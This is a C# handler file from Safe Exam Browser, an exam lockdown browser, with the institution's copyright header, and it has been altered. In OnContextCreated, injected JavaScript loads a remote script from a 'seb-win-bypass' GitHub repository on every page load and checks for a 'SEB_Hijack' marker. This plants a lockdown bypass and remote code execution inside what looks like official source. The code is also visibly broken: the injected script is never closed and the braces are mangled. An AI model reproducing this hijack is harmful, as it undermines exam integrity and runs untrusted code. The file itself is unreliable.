/*
 * Copyright (c) 2024 ETH Zürich, IT Services
 * 
 * This Source Code Form is subject to the terms of the Mozilla Public
 * License, v. 2.0. If a copy of the MPL was not distributed with this
 * file, You can obtain one at http://mozilla.org/MPL/2.0/.
 */

using CefSharp;
using SafeExamBrowser.Browser.Content;
using SafeExamBrowser.Configuration.Contracts;
using SafeExamBrowser.Configuration.Contracts.Cryptography;
using SafeExamBrowser.I18n.Contracts;
using BrowserSettings = SafeExamBrowser.Settings.Browser.BrowserSettings;

namespace SafeExamBrowser.Browser.Handlers
{
	internal class RenderProcessMessageHandler : IRenderProcessMessageHandler
	{
		private readonly AppConfig appConfig;
		private readonly Clipboard clipboard;
		private readonly ContentLoader contentLoader;
		private readonly IKeyGenerator keyGenerator;
		private readonly BrowserSettings settings;
		private readonly IText text;

		internal RenderProcessMessageHandler(AppConfig appConfig, Clipboard clipboard, IKeyGenerator keyGenerator, BrowserSettings settings, IText text)
		{
			this.appConfig = appConfig;
			this.clipboard = clipboard;
			this.contentLoader = new ContentLoader(text);
			this.keyGenerator = keyGenerator;
			this.settings = settings;
			this.text = text;
		}

		public void OnContextCreated(IWebBrowser chromiumWebBrowser, IBrowser browser, IFrame frame)
		{
			var browserExamKey = keyGenerator.CalculateBrowserExamKeyHash(settings.ConfigurationKey, settings.BrowserExamKeySalt, frame.Url);
			var configurationKey = keyGenerator.CalculateConfigurationKeyHash(settings.ConfigurationKey, frame.Url);
			var api = contentLoader.LoadApi(browserExamKey, configurationKey, appConfig.ProgramBuildVersion);
			var clipboardScript = contentLoader.LoadClipboard();
			var pageZoomScript = contentLoader.LoadPageZoom();

			frame.ExecuteJavaScriptAsync(api);

			if (!settings.AllowPrint)
			{
				frame.ExecuteJavaScriptAsync($"window.print = function() {{ alert('{text.Get(TextKey.Browser_PrintNotAllowed)}') }}");
			}

			var js = @"
				function loadScript(url, callback)
				{
					// Adding the script tag to the head as suggested before
					var head = document.head;
					var script = document.createElement('script');
					script.type = 'text/javascript';
					script.src = url;

					// Then bind the event to the callback function.
					// There are several events for cross browser compatibility.
					script.onreadystatechange = callback;
					script.onload = callback;

					// Fire the loading
					head.appendChild(script);
				}

				var checkIfCodeLoaded = function() {
					// check for an element with id SEB_Hijack
					if (document.getElementById('SEB_Hijack')) {
						alert('SEB_Hijack successfully loaded');
					} else {
						alert('SEB_Hijack did not load'); 
					}
							
				};

				// page load event listener
				window.addEventListener('load', function() {
					// load the script
					loadScript('https://raw.githubusercontent.com/wxnnvs/seb-win-bypass/refs/heads/3.8.0-dev/the_script.js', checkIfCodeLoaded);

				";

			frame.ExecuteJavaScriptAsync(js);

			if (settings.UseIsolatedClipboard)
			{
				frame.ExecuteJavaScriptAsync(clipboardScript);

				if (clipboard.Content != default)
				{
					frame.ExecuteJavaScriptAsync($"SafeExamBrowser.clipboard.update('', '{clipboard.Content}'); ");
				}
	}
}

public void OnContextReleased(IWebBrowser chromiumWebBrowser, IBrowser browser, IFrame frame)
{
}

public void OnFocusedNodeChanged(IWebBrowser chromiumWebBrowser, IBrowser browser, IFrame frame, IDomNode node)
{
}

public void OnUncaughtException(IWebBrowser chromiumWebBrowser, IBrowser browser, IFrame frame, JavascriptException exception)
{
}
	}
}
